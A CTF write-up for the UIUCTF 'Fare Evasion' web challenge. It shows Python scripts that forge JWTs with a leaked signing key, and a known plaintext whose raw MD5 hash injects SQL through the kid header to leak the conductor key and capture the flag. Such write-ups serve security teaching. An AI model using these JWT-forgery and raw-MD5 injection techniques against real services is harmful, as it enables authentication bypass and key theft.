## Fare Evasion (370 points)

### Description

SIGPwny Transit Authority needs your fares, but the system is acting a tad odd. We'll let you sign your tickets this time!

[https://fare-evasion.chal.uiuc.tf/](https://fare-evasion.chal.uiuc.tf/)

### Application analysis

The provided website is simple, primarily featuring a button that triggers a request to the `/pay` endpoint. Here's the relevant script:

```html
<script>
  async function pay() {
    // i could not get sqlite to work on the frontend :(
    /*
        db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => {
        ???????
    */
    const r = await fetch("/pay", { method: "POST" });
    const j = await r.json();
    document.getElementById("alert").classList.add("opacity-100");
    // todo: convert md5 to hex string instead of latin1??
    document.getElementById("alert").innerText = j["message"];
    setTimeout(() => { document.getElementById("alert").classList.remove("opacity-100") }, 5000);
  }
</script>
```
It looks like we got a hint(s) here:
- the SQLite query that is used on backend
- the encoding used on the backend

There's an `access_token` Cookie set by the server:

```
eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs
```

This resembles a JWT token. Using the [jwt_tool](https://github.com/ticarpi/jwt_tool):

```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs
```

Outputs:

```
Token header values:
[+] alg = "HS256"
[+] kid = "passenger_key"
[+] typ = "JWT"

Token payload values:
[+] type = "passenger"
```

Server's response:

```json
{
    "message": "Sorry passenger, only conductors are allowed right now. Please sign your own tickets. \nhashed _\bR\u00f2\u001es\u00dcx\u00c9\u00c4\u0002\u00c5\u00b4\u0012\\\u00e4 secret: a_boring_passenger_signing_key_?",
    "success": false
}
```

The application's response provides the HS256 signing key and hints us to sign our own keys as passengers.

### Custom JWT

We are given the passenger JWT signing key, allowing us to craft our own JWT tokens. 
First, let's try changing the `type` in the JWT payload to `conductor`:

```python
import jwt
import requests

url = "https://fare-evasion.chal.uiuc.tf/pay"
secret = "a_boring_passenger_signing_key_?"

token = jwt.encode({"type": "conductor"}, key=secret, algorithm="HS256", headers={"kid": "passenger_key"})
response = requests.post(url, cookies={"access_token": token})
print(response.text)
```

Unfortunately, the same response. 
Let's try using the different signing key:

```python
secret = "a_boring_conductor_signing_key_?"
token = jwt.encode({"type": "conductor"}, key=secret, algorithm="HS256", headers={"kid": "passenger_key"})
response = requests.post(url, cookies={"access_token": token})
print(response.text)
```

Response:

```json
{
    "message": "Key isn't passenger or conductor. Please sign your own tickets. \nhashed \u00f4\u008c\u00f7u\u009e\u00deIB\u0090\u0005\u0084\u009fB\u00e7\u00d9+ secret: conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e\nhashed _\bR\u00f2\u001es\u00dcx\u00c9\u00c4\u0002\u00c5\u00b4\u0012\\\u00e4 secret: a_boring_passenger_signing_key_?",
    "success": false
}
```

Now, playing with the `kid` header:

```python
token = jwt.encode({"type": "passenger"}, key=secret, algorithm="HS256", headers={"kid": "conductor_key"})
response = requests.post(url, cookies={"access_token": token})
print(response.text)
```

Response:

```json
{
    "message": "Sorry passenger, only conductors are allowed right now. Please sign your own tickets.",
    "success": false
}
```

### Understanding the Backend

Based on the responses, assumptions are:
- Backend validates JWT using passenger or conductor keys and the "user role" is assigned accordingly
- `kid` header is used to fetch the corresponding signing key from SQLite DB (SQL query hint) and add it to the response
- Hash digest might be wrongly encoded using `latin1`.

Recreating the backend process:

```node
const crypto = require('crypto')

let hash = crypto.createHash('md5').update('passenger_key').digest('latin1');
console.log(`SELECT * FROM keys WHERE kid = '${hash}'`);
```

Result:

```
SELECT * FROM keys WHERE kid = '_RòsÜxÉÄÅ´\ä'
```

The incorrectly encoded hash could enable SQL injection!

Testing potential string breaking the SQL query:

```python
kid = ""
while True:
    token = jwt.encode({"type": "passenger"}, key=secret, algorithm="HS256", headers={"kid": kid})
    response = requests.post(url, cookies={"access_token": token})
    if "passenger" not in response.text:
        print(kid, response.text)
        break
    kid += "a"
```

Response for empty `kid`:

```json
{
    "message": "the query contains a null character",
    "success": false
}
```

The hash of empty string indeed contains a null byte! (d41d8cd98f**00**b204e9800998ecf8427e)

### Crafting the payload

Now we know, that we need to find a string which `md5` hash could execute an SQL injection, put it as a `kid` header and we should get the conductor signing key in the response. Reversing an `md5` hash doesn't sound like a good idea (even though it's not secure algorithm and it's possible to generate collisions for years already!), so we could try to find such hash using bruteforce methods. Or... simply Google it :)

There's this 14-years old CTF writeup I found in Google that provides us with the hash that we need: https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes:

```
plaintext:  129581926211651571912466741651878684928
md5:        06da5430449f8f6f23dfc1276f722738
raw:        ?T0D??o#??'or'8.N=?
```

### Exploitation

Using the identified `kid` header value for SQL injection:

```python
token = jwt.encode({"type": "passenger"}, key=secret, algorithm="HS256", headers={"kid": "129581926211651571912466741651878684928"})
response = requests.post(url, cookies={"access_token": token})
print(response.text)
```

Response:

```json
{
    "message": "Key isn't passenger or conductor. Please sign your own tickets. \nhashed ô÷uÞIB\u0005BçÙ+ secret: conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e\nhashed _\bRò\u001esÜxÉÄ\u0002Å´\u0012\\ä secret: a_boring_passenger_signing_key_?",
    "success": false
}
```

We got the conductor signing key! Let's use it:

```python
secret="conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e"
token = jwt.encode({"type": "conductor"}, key=secret, algorithm="HS256", headers={"kid": "whatever"})
response = requests.post(url, cookies={"access_token": token})
print(response.text)
```

Success! We got the flag:

```json
{
    "message": "Conductor override success. uiuctf{sigpwny_does_not_condone_turnstile_hopping!}",
    "success": true
}
```

### Credits

- Louis (https://github.com/LouisAsanaka) for creating this challenge
- Christian von Kleist for the CTF writeup I used to find a solution: https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes
